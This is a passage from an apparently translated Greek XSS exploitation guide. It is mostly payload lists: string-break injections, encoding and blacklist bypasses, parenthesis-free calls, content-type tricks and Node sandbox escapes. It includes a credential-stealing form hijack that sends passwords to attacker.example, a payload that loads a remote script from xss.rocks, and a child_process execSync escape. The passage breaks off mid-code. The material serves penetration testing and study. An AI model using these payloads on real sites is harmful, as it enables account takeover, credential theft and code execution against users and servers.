Σημειώστε ότι σε αυτό το παράδειγμα **δεν έχουμε καν κλείσει το single quote**. Αυτό συμβαίνει επειδή **HTML parsing is performed first by the browser**, η οποία περιλαμβάνει την αναγνώριση στοιχείων της σελίδας, συμπεριλαμβανομένων των blocks του script. Η parsing του JavaScript για να κατανοήσει και να εκτελέσει τα ενσωματωμένα scripts γίνεται μόνο αργότερα.

### Μέσα στον κώδικα JS

Αν τα `<>` είναι sanitised μπορείτε ακόμα να **escape the string** στο σημείο όπου το input σας είναι **located** και να **execute arbitrary JS**. Είναι σημαντικό να **fix JS syntax**, γιατί αν υπάρχουν σφάλματα, ο JS κώδικας δεν θα εκτελεστεί:
```
'-alert(document.domain)-'
';alert(document.domain)//
\';alert(document.domain)//
```
#### JS-in-JS string break → inject → repair pattern

Όταν η είσοδος χρήστη (user input) καταλήγει μέσα σε ένα quoted JavaScript string (π.χ., server-side echo σε ένα inline script), μπορείς να terminate the string, να inject code και να repair the syntax ώστε το parsing να παραμείνει έγκυρο. Γενικός σκελετός:
```
"            // end original string
;            // safely terminate the statement
<INJECTION>  // attacker-controlled JS
; a = "      // repair and resume expected string/statement
```
Παράδειγμα προτύπου URL όταν η ευάλωτη παράμετρος αντανακλάται σε μια JS string:
```
?param=test";<INJECTION>;a="
```
Αυτό εκτελεί attacker JS χωρίς να χρειάζεται να αγγίξεις το HTML context (pure JS-in-JS). Συνδύασέ το με blacklist bypasses παρακάτω όταν τα φίλτρα μπλοκάρουν keywords.

### Template literals ``

Για να κατασκευάσεις **strings**, πέρα από τα μονά και διπλά εισαγωγικά, το JS δέχεται επίσης **backticks** **` `` `**. Αυτό είναι γνωστό ως template literals καθώς επιτρέπουν να ενσωματωθούν **embedded JS expressions** χρησιμοποιώντας τη σύνταξη `${ ... }`.\
Επομένως, αν διαπιστώσεις ότι η είσοδός σου αντανακλάται μέσα σε μια JS string που χρησιμοποιεί backticks, μπορείς να εκμεταλλευτείς τη σύνταξη `${ ... }` για να εκτελέσεις **arbitrary JS code**:

Αυτό μπορεί να **εκμεταλλευτεί** χρησιμοποιώντας:
```javascript
;`${alert(1)}``${`${`${`${alert(1)}`}`}`}`
```

```javascript
// This is valid JS code, because each time the function returns itself it's recalled with ``
function loop() {
return loop
}
loop``
```
### Κωδικοποιημένη εκτέλεση κώδικα
```html
<script>\u0061lert(1)</script>
<svg><script>alert&lpar;'1'&rpar;
<svg><script>alert(1)</script></svg>  <!-- The svg tags are neccesary
<iframe srcdoc="<SCRIPT>alert(1)</iframe>">
```
#### Παραδοτέα payloads με eval(atob()) και αποχρώσεις του scope

Για να κρατήσετε τις URLs πιο σύντομες και να παρακάμψετε απλούς φίλτρους λέξεων-κλειδιών, μπορείτε να base64-encode την πραγματική σας λογική και να την αξιολογήσετε με `eval(atob('...'))`. Αν απλό φιλτράρισμα λέξεων-κλειδιών μπλοκάρει αναγνωριστικά όπως `alert`, `eval`, ή `atob`, χρησιμοποιήστε Unicode-escaped αναγνωριστικά που compile ταυτόσημα στο browser αλλά παρακάμπτουν φίλτρα που κάνουν αντιστοίχιση συμβολοσειρών:
```
\u0061\u006C\u0065\u0072\u0074(1)                      // alert(1)
\u0065\u0076\u0061\u006C(\u0061\u0074\u006F\u0062('BASE64'))  // eval(atob('...'))
```
Σημαντική παρατήρηση σχετικά με το scoping: `const`/`let` που δηλώνονται μέσα σε `eval()` είναι block-scoped και ΔΕΝ δημιουργούν globals· δεν θα είναι προσβάσιμα από μεταγενέστερα scripts. Χρησιμοποιήστε ένα δυναμικά εισαγόμενο στοιχείο `<script>` για να ορίσετε global, μη-επαναδεσμεύσιμα hooks όταν χρειάζεται (π.χ., για να hijack ένα form handler):
```javascript
var s = document.createElement('script');
s.textContent = "const DoLogin = () => {const pwd = Trim(FormInput.InputPassword.value); const user = Trim(FormInput.InputUtente.value); fetch('https://attacker.example/?u='+encodeURIComponent(user)+'&p='+encodeURIComponent(pwd));}";
document.head.appendChild(s);
```
Αναφορά: https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval

### Εκτέλεση JS με κωδικοποίηση Unicode
```javascript
alert(1)
alert(1)
alert(1)
```
### JavaScript bypass blacklists techniques

**Strings**
```javascript
"thisisastring"
'thisisastrig'
`thisisastring`
/thisisastring/ == "/thisisastring/"
/thisisastring/.source == "thisisastring"
"\h\e\l\l\o"
String.fromCharCode(116,104,105,115,105,115,97,115,116,114,105,110,103)
"\x74\x68\x69\x73\x69\x73\x61\x73\x74\x72\x69\x6e\x67"
"\164\150\151\163\151\163\141\163\164\162\151\156\147"
"\u0074\u0068\u0069\u0073\u0069\u0073\u0061\u0073\u0074\u0072\u0069\u006e\u0067"
"\u{74}\u{68}\u{69}\u{73}\u{69}\u{73}\u{61}\u{73}\u{74}\u{72}\u{69}\u{6e}\u{67}"
"\a\l\ert\(1\)"
atob("dGhpc2lzYXN0cmluZw==")
eval(8680439..toString(30))(983801..toString(36))
```
**Ειδικές ακολουθίες διαφυγής**
```javascript
"\b" //backspace
"\f" //form feed
"\n" //new line
"\r" //carriage return
"\t" //tab
"\b" //backspace
"\f" //form feed
"\n" //new line
"\r" //carriage return
"\t" //tab
// Any other char escaped is just itself
```
**Αντικαταστάσεις κενών μέσα σε JS code**
```javascript
<TAB>
/**/
```
**JavaScript σχόλια (από** [**JavaScript Comments**](#javascript-comments) **κόλπο)**
```javascript
//This is a 1 line comment
/* This is a multiline comment*/
<!--This is a 1line comment
#!This is a 1 line comment, but "#!" must to be at the beggining of the first line
-->This is a 1 line comment, but "-->" must to be at the beggining of the first line
```
**JavaScript new lines (από** [**JavaScript new line**](#javascript-new-lines) **κόλπο)**
```javascript
//Javascript interpret as new line these chars:
String.fromCharCode(10)
alert("//\nalert(1)") //0x0a
String.fromCharCode(13)
alert("//\ralert(1)") //0x0d
String.fromCharCode(8232)
alert("//\u2028alert(1)") //0xe2 0x80 0xa8
String.fromCharCode(8233)
alert("//\u2029alert(1)") //0xe2 0x80 0xa9
```
**JavaScript κενά**
```javascript
log=[];
function funct(){}
for(let i=0;i<=0x10ffff;i++){
try{
eval(`funct${String.fromCodePoint(i)}()`);
log.push(i);
}
catch(e){}
}
console.log(log)
//9,10,11,12,13,32,160,5760,8192,8193,8194,8195,8196,8197,8198,8199,8200,8201,8202,8232,8233,8239,8287,12288,65279

//Either the raw characters can be used or you can HTML encode them if they appear in SVG or HTML attributes:
<img/src/onerror=alert&#65279;(1)>
```
**Javascript μέσα σε ένα σχόλιο**
```javascript
//If you can only inject inside a JS comment, you can still leak something
//If the user opens DevTools request to the indicated sourceMappingURL will be send

//# sourceMappingURL=https://evdr12qyinbtbd29yju31993gumlaby0.oastify.com
```
**JavaScript χωρίς παρενθέσεις**
```javascript
// By setting location
window.location='javascript:alert\x281\x29'
x=new DOMMatrix;matrix=alert;x.a=1337;location='javascript'+':'+x
// or any DOMXSS sink such as location=name

// Backtips
// Backtips pass the string as an array of lenght 1
alert`1`

// Backtips + Tagged Templates + call/apply
eval`alert\x281\x29` // This won't work as it will just return the passed array
setTimeout`alert\x281\x29`
eval.call`${'alert\x281\x29'}`
eval.apply`${[`alert\x281\x29`]}`
[].sort.call`${alert}1337`
[].map.call`${eval}\\u{61}lert\x281337\x29`

// To pass several arguments you can use
function btt(){
console.log(arguments);
}
btt`${'arg1'}${'arg2'}${'arg3'}`

//It's possible to construct a function and call it
Function`x${'alert(1337)'}x`

// .replace can use regexes and call a function if something is found
"a,".replace`a${alert}` //Initial ["a"] is passed to str as "a," and thats why the initial string is "a,"
"a".replace.call`1${/./}${alert}`
// This happened in the previous example
// Change "this" value of call to "1,"
// match anything with regex /./
// call alert with "1"
"a".replace.call`1337${/..../}${alert}` //alert with 1337 instead

// Using Reflect.apply to call any function with any argumnets
Reflect.apply.call`${alert}${window}${[1337]}` //Pass the function to call (“alert”), then the “this” value to that function (“window”) which avoids the illegal invocation error and finally an array of arguments to pass to the function.
Reflect.apply.call`${navigation.navigate}${navigation}${[name]}`
// Using Reflect.set to call set any value to a variable
Reflect.set.call`${location}${'href'}${'javascript:alert\x281337\x29'}` // It requires a valid object in the first argument (“location”), a property in the second argument and a value to assign in the third.



// valueOf, toString
// These operations are called when the object is used as a primitive
// Because the objet is passed as "this" and alert() needs "window" to be the value of "this", "window" methods are used
valueOf=alert;window+''
toString=alert;window+''


// Error handler
window.onerror=eval;throw"=alert\x281\x29";
onerror=eval;throw"=alert\x281\x29";
<img src=x onerror="window.onerror=eval;throw'=alert\x281\x29'">
{onerror=eval}throw"=alert(1)" //No ";"
onerror=alert //No ";" using new line
throw 1337
// Error handler + Special unicode separators
eval("onerror=\u2028alert\u2029throw 1337");
// Error handler + Comma separator
// The comma separator goes through the list and returns only the last element
var a = (1,2,3,4,5,6) // a = 6
throw onerror=alert,1337 // this is throw 1337, after setting the onerror event to alert
throw onerror=alert,1,1,1,1,1,1337
// optional exception variables inside a catch clause.
try{throw onerror=alert}catch{throw 1}


// Has instance symbol
'alert\x281\x29'instanceof{[Symbol['hasInstance']]:eval}
'alert\x281\x29'instanceof{[Symbol.hasInstance]:eval}
// The “has instance” symbol allows you to customise the behaviour of the instanceof operator, if you set this symbol it will pass the left operand to the function defined by the symbol.

```
- [https://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md](https://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md)
- [https://portswigger.net/research/javascript-without-parentheses-using-dommatrix](https://portswigger.net/research/javascript-without-parentheses-using-dommatrix)

**Αυθαίρετη κλήση συνάρτησης (alert)**
```javascript
//Eval like functions
eval('ale'+'rt(1)')
setTimeout('ale'+'rt(2)');
setInterval('ale'+'rt(10)');
Function('ale'+'rt(10)')``;
[].constructor.constructor("alert(document.domain)")``
[]["constructor"]["constructor"]`$${alert()}```
import('data:text/javascript,alert(1)')

//General function executions
`` //Can be use as parenthesis
alert`document.cookie`
alert(document['cookie'])
with(document)alert(cookie)
(alert)(1)
(alert(1))in"."
a=alert,a(1)
[1].find(alert)
window['alert'](0)
parent['alert'](1)
self['alert'](2)
top['alert'](3)
this['alert'](4)
frames['alert'](5)
content['alert'](6)
[7].map(alert)
[8].find(alert)
[9].every(alert)
[10].filter(alert)
[11].findIndex(alert)
[12].forEach(alert);
top[/al/.source+/ert/.source](1)
top[8680439..toString(30)](1)
Function("ale"+"rt(1)")();
new Function`al\ert\`6\``;
Set.constructor('ale'+'rt(13)')();
Set.constructor`al\x65rt\x2814\x29```;
$='e'; x='ev'+'al'; x=this[x]; y='al'+$+'rt(1)'; y=x(y); x(y)
x='ev'+'al'; x=this[x]; y='ale'+'rt(1)'; x(x(y))
this[[]+('eva')+(/x/,new Array)+'l'](/xxx.xxx.xxx.xxx.xx/+alert(1),new Array)
globalThis[`al`+/ert/.source]`1`
this[`al`+/ert/.source]`1`
[alert][0].call(this,1)
window['a'+'l'+'e'+'r'+'t']()
window['a'+'l'+'e'+'r'+'t'].call(this,1)
top['a'+'l'+'e'+'r'+'t'].apply(this,[1])
(1,2,3,4,5,6,7,8,alert)(1)
x=alert,x(1)
[1].find(alert)
top["al"+"ert"](1)
top[/al/.source+/ert/.source](1)
al\u0065rt(1)
al\u0065rt`1`
top['al\145rt'](1)
top['al\x65rt'](1)
top[8680439..toString(30)](1)
<svg><animate onbegin=alert() attributeName=x></svg>
```
## **DOM vulnerabilities**

Υπάρχει **JS code** που χρησιμοποιεί **δεδομένα που ελέγχονται από επιτιθέμενο με μη ασφαλή τρόπο** όπως `location.href` . Ένας επιτιθέμενος μπορεί να εκμεταλλευτεί αυτό για να εκτελέσει αυθαίρετο JS code.\
**Εξαιτίας της εκτενούς εξήγησης των** [**DOM vulnerabilities it was moved to this page**](dom-xss.md)**:**


{{#ref}}
dom-xss.md
{{#endref}}

Εκεί θα βρείτε μια λεπτομερή **εξήγηση του τι είναι οι DOM vulnerabilities, πώς προκαλούνται, και πώς να τις εκμεταλλευτείτε**.\
Επίσης, μην ξεχάσετε ότι **στο τέλος του αναφερόμενου άρθρου** μπορείτε να βρείτε μια εξήγηση για [**DOM Clobbering attacks**](dom-xss.md#dom-clobbering).

### Αναβάθμιση Self-XSS

### Cookie XSS

Αν μπορείτε να ενεργοποιήσετε ένα XSS στέλνοντας το payload μέσα σε cookie, αυτό συνήθως είναι self-XSS. Ωστόσο, αν βρείτε ένα **vulnerable subdomain to XSS**, μπορείτε να εκμεταλλευτείτε αυτό το XSS για να εγχύσετε ένα cookie σε ολόκληρο το domain και να καταφέρετε να ενεργοποιήσετε το cookie XSS στο main domain ή σε άλλα subdomains (αυτά που είναι vulnerable σε cookie XSS). Για αυτό μπορείτε να χρησιμοποιήσετε το cookie tossing attack:


{{#ref}}
../hacking-with-cookies/cookie-tossing.md
{{#endref}}

You can find a great abuse of this technique in [**this blog post**](https://nokline.github.io/bugbounty/2024/06/07/Zoom-ATO.html).

### Αποστολή της session σας στον admin

Ίσως ένας user μπορεί να μοιραστεί το profile του με τον admin και αν το self XSS βρίσκεται μέσα στο profile του χρήστη και ο admin το προσπελάσει, θα ενεργοποιήσει την ευπάθεια.

### Session Mirroring

Αν βρείτε κάποιο self XSS και η σελίδα έχει **session mirroring for administrators**, για παράδειγμα επιτρέποντας στους clients να ζητήσουν βοήθεια και ώστε ο admin να σας βοηθήσει, θα βλέπει αυτό που βλέπετε στη session σας αλλά από τη δική του session.

Μπορείτε να κάνετε τον **administrator να ενεργοποιήσει το self XSS σας** και να κλέψετε τα cookies/session του.

## Other Bypasses

### Bypassing sanitization via WASM linear-memory template overwrite

When a web app uses Emscripten/WASM, constant strings (like HTML format stubs) live in writable linear memory. A single in‑WASM overflow (e.g., unchecked memcpy in an edit path) can corrupt adjacent structures and redirect writes to those constants. Overwriting a template such as "<article><p>%.*s</p></article>" to "<img src=1 onerror=%.*s>" turns sanitized input into a JavaScript handler value and yields immediate DOM XSS on render.

Check the dedicated page with exploitation workflow, DevTools memory helpers, and defenses:

{{#ref}}
wasm-linear-memory-template-overwrite-xss.md
{{#endref}}


### Normalised Unicode

Μπορείτε να ελέγξετε αν οι **reflected values** υποβάλλονται σε **unicode normalized** στον server (ή στην client side) και να καταχραστείτε αυτή τη λειτουργικότητα για να παρακάμψετε προστασίες. [**Find an example here**](../unicode-injection/index.html#xss-cross-site-scripting).

### PHP FILTER_VALIDATE_EMAIL flag Bypass
```javascript
"><svg/onload=confirm(1)>"@x.y
```
### Ruby-On-Rails bypass

Εξαιτίας του **RoR mass assignment** εισάγονται εισαγωγικά στο HTML και έτσι παρακάμπτεται ο περιορισμός των εισαγωγικών και μπορούν να προστεθούν επιπλέον πεδία (onfocus) μέσα στην ετικέτα.\
Παράδειγμα φόρμας ([from this report](https://hackerone.com/reports/709336)), αν στείλετε το payload:
```
contact[email] onfocus=javascript:alert('xss') autofocus a=a&form_type[a]aaa
```
Το ζευγάρι "Key","Value" θα επιστραφεί ως εξής:
```
{" onfocus=javascript:alert(&#39;xss&#39;) autofocus a"=>"a"}
```
Τότε, το onfocus attribute θα εισαχθεί και θα προκύψει XSS.

### Ειδικοί συνδυασμοί
```html
<iframe/src="data:text/html,<svg onload=alert(1)>">
<input type=image src onerror="prompt(1)">
<svg onload=alert(1)//
<img src="/" =_=" title="onerror='prompt(1)'">
<img src='1' onerror='alert(0)' <
<script x> alert(1) </script 1=2
<script x>alert('XSS')<script y>
<svg/onload=location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//
<svg////////onload=alert(1)>
<svg id=x;onload=alert(1)>
<svg id=`x`onload=alert(1)>
<img src=1 alt=al lang=ert onerror=top[alt+lang](0)>
<script>$=1,alert($)</script>
<script ~~~>confirm(1)</script ~~~>
<script>$=1,\u0061lert($)</script>
<</script/script><script>eval('\\u'+'0061'+'lert(1)')//</script>
<</script/script><script ~~~>\u0061lert(1)</script ~~~>
</style></scRipt><scRipt>alert(1)</scRipt>
<img src=x:prompt(eval(alt)) onerror=eval(src) alt=String.fromCharCode(88,83,83)>
<svg><x><script>alert('1'&#41</x>
<iframe src=""/srcdoc='<svg onload=alert(1)>'>
<svg><animate onbegin=alert() attributeName=x></svg>
<img/id="alert('XSS')\"/alt=\"/\"src=\"/\"onerror=eval(id)>
<img src=1 onerror="s=document.createElement('script');s.src='http://xss.rocks/xss.js';document.body.appendChild(s);">
(function(x){this[x+`ert`](1)})`al`
window[`al`+/e/[`ex`+`ec`]`e`+`rt`](2)
document['default'+'View'][`\u0061lert`](3)
```
### XSS with header injection in a 302 response

Εάν διαπιστώσεις ότι μπορείς να **inject headers in a 302 Redirect response** μπορείς να προσπαθήσεις να **αναγκάσεις τον browser να εκτελέσει αυθαίρετο JavaScript**. Αυτό δεν είναι **trivial** καθώς οι σύγχρονοι browsers δεν ερμηνεύουν το σώμα της HTTP response αν το HTTP response status code είναι 302, οπότε ένα απλό cross-site scripting payload είναι άχρηστο.

In [**this report**](https://www.gremwell.com/firefox-xss-302) and [**this one**](https://www.hahwul.com/2020/10/03/forcing-http-redirect-xss/) μπορείτε να διαβάσετε πώς να δοκιμάσετε διάφορα πρωτόκολλα μέσα στο Location header και να δείτε αν κάποιο από αυτά επιτρέπει στον browser να επιθεωρήσει και να εκτελέσει το XSS payload μέσα στο σώμα.\
Past known protocols: `mailto://`, `//x:1/`, `ws://`, `wss://`, _empty Location header_, `resource://`.

### Μόνο γράμματα, αριθμοί και τελείες

Αν μπορείς να υποδείξεις το **callback** που το javascript πρόκειται να **εκτελέσει** περιορισμένο σε αυτούς τους χαρακτήρες. [**Read this section of this post**](#javascript-function) για να μάθεις πώς να εκμεταλλευτείς αυτή τη συμπεριφορά.

### Valid `<script>` Content-Types to XSS

(From [**here**](https://blog.huli.tw/2022/04/24/en/how-much-do-you-know-about-script-type/)) Αν προσπαθήσεις να φορτώσεις ένα script με **content-type** όπως `application/octet-stream`, το Chrome θα εμφανίσει το ακόλουθο σφάλμα:

> Refused to execute script from ‘[https://uploader.c.hc.lc/uploads/xxx'](https://uploader.c.hc.lc/uploads/xxx') because its MIME type (‘application/octet-stream’) is not executable, and strict MIME type checking is enabled.

Οι μόνοι **Content-Type**s που θα επιτρέψουν στο Chrome να τρέξει ένα **loaded script** είναι αυτοί που περιλαμβάνονται στην const **`kSupportedJavascriptTypes`** από [https://chromium.googlesource.com/chromium/src.git/+/refs/tags/103.0.5012.1/third_party/blink/common/mime_util/mime_util.cc](https://chromium.googlesource.com/chromium/src.git/+/refs/tags/103.0.5012.1/third_party/blink/common/mime_util/mime_util.cc)
```c
const char* const kSupportedJavascriptTypes[] = {
"application/ecmascript",
"application/javascript",
"application/x-ecmascript",
"application/x-javascript",
"text/ecmascript",
"text/javascript",
"text/javascript1.0",
"text/javascript1.1",
"text/javascript1.2",
"text/javascript1.3",
"text/javascript1.4",
"text/javascript1.5",
"text/jscript",
"text/livescript",
"text/x-ecmascript",
"text/x-javascript",
};

```
### Τύποι script για XSS

(Από [**here**](https://blog.huli.tw/2022/04/24/en/how-much-do-you-know-about-script-type/)) Λοιπόν, ποιους τύπους μπορούμε να χρησιμοποιήσουμε για να φορτώσουμε ένα script;
```html
<script type="???"></script>
```
Η απάντηση είναι:

- **module** (προεπιλεγμένο, δεν χρειάζεται εξήγηση)
- [**webbundle**](https://web.dev/web-bundles/): Web Bundles είναι μια δυνατότητα που σου επιτρέπει να πακετάρεις πολλά δεδομένα (HTML, CSS, JS…) μαζί σε ένα αρχείο **`.wbn`**.
```html
<script type="webbundle">
{
"source": "https://example.com/dir/subresources.wbn",
"resources": ["https://example.com/dir/a.js", "https://example.com/dir/b.js", "https://example.com/dir/c.png"]
}
</script>
The resources are loaded from the source .wbn, not accessed via HTTP
```
- [**importmap**](https://github.com/WICG/import-maps)**:** Επιτρέπει τη βελτίωση της σύνταξης import
```html
<script type="importmap">
{
"imports": {
"moment": "/node_modules/moment/src/moment.js",
"lodash": "/node_modules/lodash-es/lodash.js"
}
}
</script>

<!-- With importmap you can do the following -->
<script>
import moment from "moment"
import { partition } from "lodash"
</script>
```
Αυτή η συμπεριφορά χρησιμοποιήθηκε στο [**this writeup**](https://github.com/zwade/yaca/tree/master/solution) για να ανακατευθύνει μια βιβλιοθήκη στο eval, ώστε η κατάχρησή της να μπορεί να προκαλέσει XSS.

- [**speculationrules**](https://github.com/WICG/nav-speculation)**:** Αυτή η λειτουργία υπάρχει κυρίως για να λύσει κάποια προβλήματα που προκαλούνται από pre-rendering. Λειτουργεί ως εξής:
```html
<script type="speculationrules">
{
"prerender": [
{ "source": "list", "urls": ["/page/2"], "score": 0.5 },
{
"source": "document",
"if_href_matches": ["https://*.wikipedia.org/**"],
"if_not_selector_matches": [".restricted-section *"],
"score": 0.1
}
]
}
</script>
```
### Web Content-Types to XSS

(Από [**here**](https://blog.huli.tw/2022/04/24/en/how-much-do-you-know-about-script-type/)) Οι παρακάτω Content-Types μπορούν να εκτελέσουν XSS σε όλους τους browsers:

- text/html
- application/xhtml+xml
- application/xml
- text/xml
- image/svg+xml
- text/plain (?? όχι στη λίστα αλλά νομίζω το είδα σε ένα CTF)
- application/rss+xml (off)
- application/atom+xml (off)

Σε άλλους browsers, άλλοι **`Content-Types`** μπορούν να χρησιμοποιηθούν για να εκτελέσουν αυθαίρετο JS, δείτε: [https://github.com/BlackFan/content-type-research/blob/master/XSS.md](https://github.com/BlackFan/content-type-research/blob/master/XSS.md)

### xml Content Type

Αν η σελίδα επιστρέφει content-type text/xml, είναι δυνατόν να υποδείξετε ένα namespace και να εκτελέσετε αυθαίρετο JS:
```xml
<xml>
<text>hello<img src="1" onerror="alert(1)" xmlns="http://www.w3.org/1999/xhtml" /></text>
</xml>

<!-- Heyes, Gareth. JavaScript for hackers: Learn to think like a hacker (p. 113). Kindle Edition. -->
```
### Ειδικά πρότυπα αντικατάστασης

Όταν χρησιμοποιείται κάτι όπως **`"some {{template}} data".replace("{{template}}", <user_input>)`**. Ο επιτιθέμενος μπορεί να χρησιμοποιήσει [**special string replacements**](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/replace#specifying_a_string_as_the_replacement) για να προσπαθήσει να παρακάμψει κάποιες προστασίες: `` "123 {{template}} 456".replace("{{template}}", JSON.stringify({"name": "$'$`alert(1)//"})) ``

Για παράδειγμα, στο [**this writeup**](https://gitea.nitowa.xyz/nitowa/PlaidCTF-YACA), αυτό χρησιμοποιήθηκε για να **ξεφύγει από μια JSON συμβολοσειρά** μέσα σε ένα script και να εκτελέσει αυθαίρετο κώδικα.

### Chrome Cache to XSS


{{#ref}}
chrome-cache-to-xss.md
{{#endref}}

### XS Jails Escape

Αν έχετε περιορισμένο σύνολο χαρακτήρων προς χρήση, δείτε αυτές τις άλλες έγκυρες λύσεις για προβλήματα XSJail:
```javascript
// eval + unescape + regex
eval(unescape(/%2f%0athis%2econstructor%2econstructor(%22return(process%2emainModule%2erequire(%27fs%27)%2ereadFileSync(%27flag%2etxt%27,%27utf8%27))%22)%2f/))()
eval(unescape(1+/1,this%2evalueOf%2econstructor(%22process%2emainModule%2erequire(%27repl%27)%2estart()%22)()%2f/))

// use of with
with(console)log(123)
with(/console.log(1)/index.html)with(this)with(constructor)constructor(source)()
// Just replace console.log(1) to the real code, the code we want to run is:
//return String(process.mainModule.require('fs').readFileSync('flag.txt'))

with(process)with(mainModule)with(require('fs'))return(String(readFileSync('flag.txt')))
with(k='fs',n='flag.txt',process)with(mainModule)with(require(k))return(String(readFileSync(n)))
with(String)with(f=fromCharCode,k=f(102,115),n=f(102,108,97,103,46,116,120,116),process)with(mainModule)with(require(k))return(String(readFileSync(n)))

//Final solution
with(
/with(String)
with(f=fromCharCode,k=f(102,115),n=f(102,108,97,103,46,116,120,116),process)
with(mainModule)
with(require(k))
return(String(readFileSync(n)))
/)
with(this)
with(constructor)
constructor(source)()

// For more uses of with go to challenge misc/CaaSio PSE in
// https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#misc/CaaSio%20PSE
```
Αν **όλα είναι undefined** πριν από την εκτέλεση μη αξιόπιστου κώδικα (όπως στο [**this writeup**](https://blog.huli.tw/2022/02/08/en/what-i-learned-from-dicectf-2022/index.html#miscx2fundefined55-solves)) είναι δυνατόν να δημιουργηθούν χρήσιμα αντικείμενα "εκ του μηδενός" για να καταχραστείτε την εκτέλεση αυθαίρετου, μη αξιόπιστου κώδικα:

- Χρησιμοποιώντας import()
```javascript
// although import "fs" doesn’t work, import('fs') does.
import("fs").then((m) => console.log(m.readFileSync("/flag.txt", "utf8")))
```
- Πρόσβαση στο `require` έμμεσα

[Σύμφωνα με αυτό](https://stackoverflow.com/questions/28955047/why-does-a-module-level-return-statement-work-in-node-js/28955050#28955050) τα modules τυλίγονται από το Node.js μέσα σε μια συνάρτηση, όπως παρακάτω:
```javascript
;(function (exports, require, module, __filename, __dirname) {
// our actual module code
})
```
Επομένως, εάν από αυτό το module μπορούμε να **καλέσουμε μια άλλη συνάρτηση**, είναι δυνατό να χρησιμοποιήσουμε `arguments.callee.caller.arguments[1]` από εκείνη τη συνάρτηση για να αποκτήσουμε πρόσβαση στο **`require`**:
```javascript
;(function () {
return arguments.callee.caller.arguments[1]("fs").readFileSync(
"/flag.txt",
"utf8"
)
})()
```
Με παρόμοιο τρόπο με το προηγούμενο παράδειγμα, είναι δυνατό να **use error handlers** για να αποκτήσετε πρόσβαση στον **wrapper** του module και να πάρετε τη συνάρτηση **`require`**:
```javascript
try {
null.f()
} catch (e) {
TypeError = e.constructor
}
Object = {}.constructor
String = "".constructor
Error = TypeError.prototype.__proto__.constructor
function CustomError() {
const oldStackTrace = Error.prepareStackTrace
try {
Error.prepareStackTrace = (err, structuredStackTrace) =>
structuredStackTrace
Error.captureStackTrace(this)
this.stack
} finally {
Error.prepareStackTrace = oldStackTrace
}
}
function trigger() {
const err = new CustomError()
console.log(err.stack[0])
for (const x of err.stack) {
// use x.getFunction() to get the upper function, which is the one that Node.js adds a wrapper to, and then use arugments to get the parameter
const fn = x.getFunction()
console.log(String(fn).slice(0, 200))
console.log(fn?.arguments)
console.log("=".repeat(40))
if ((args = fn?.arguments)?.length > 0) {
req = args[1]
console.log(req("child_process").execSync("id").toString())
}
}
}
trigger()
```
### Απόκρυψη & Προηγμένη Παράκαμψη

- **Διάφορες τεχνικές απόκρυψης σε μία σελίδα:** [**https://aem1k.com/aurebesh.js/**](https://aem1k.com/aurebesh.js/)
- [https://github.com/aemkei/katakana.js](https://github.com/aemkei/katakana.js)
- [https://javascriptobfuscator.herokuapp.com/](https://javascriptobfuscator.herokuapp.com)
- [https://skalman.github.io/UglifyJS-online/](https://skalman.github.io/UglifyJS-online/)
- [http://www.jsfuck.com/](http://www.jsfuck.com)
- Πιο σύνθετο JSFuck: [https://medium.com/@Master_SEC/bypass-uppercase-filters-like-a-pro-xss-advanced-methods-daf7a82673ce](https://medium.com/@Master_SEC/bypass-uppercase-filters-like-a-pro-xss-advanced-methods-daf7a82673ce)
- [http://utf-8.jp/public/jjencode.html](http://utf-8.jp/public/jjencode.html)
- [https://utf-8.jp/public/aaencode.html](https://utf-8.jp/public/aaencode.html)
- [https://portswigger.net/research/the-seventh-way-to-call-a-javascript-function-without-parentheses](https://portswigger.net/research/the-seventh-way-to-call-a-javascript-function-without-parentheses)
```javascript
//Katana
<script>
([,ウ,,,,ア]=[]+{}
,[ネ,ホ,ヌ,セ,,ミ,ハ,ヘ,,,ナ]=[!!ウ]+!ウ+ウ.ウ)[ツ=ア+ウ+ナ+ヘ+ネ+ホ+ヌ+ア+ネ+ウ+ホ][ツ](ミ+ハ+セ+ホ+ネ+'(-~ウ)')()
</script>
```

```javascript
//JJencode
<script>$=~[];$={___:++$,$:(![]+"")[$],__$:++$,$_$_:(![]+"")[$],_$_:++$,$_$:({}+"")[$],$_$:($[$]+"")[$],_$:++$,$_:(!""+"")[$],$__:++$,$_$:++$,$__:({}+"")[$],$_:++$,$:++$,$___:++$,$__$:++$};$.$_=($.$_=$+"")[$.$_$]+($._$=$.$_[$.__$])+($.$=($.$+"")[$.__$])+((!$)+"")[$._$]+($.__=$.$_[$.$_])+($.$=(!""+"")[$.__$])+($._=(!""+"")[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$=$.$+(!""+"")[$._$]+$.__+$._+$.$+$.$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$+"\""+$.$_$_+(![]+"")[$._$_]+$.$_+"\\"+$.__$+$.$_+$._$_+$.__+"("+$.___+")"+"\"")())();</script>
```

```javascript
//JSFuck
<script>
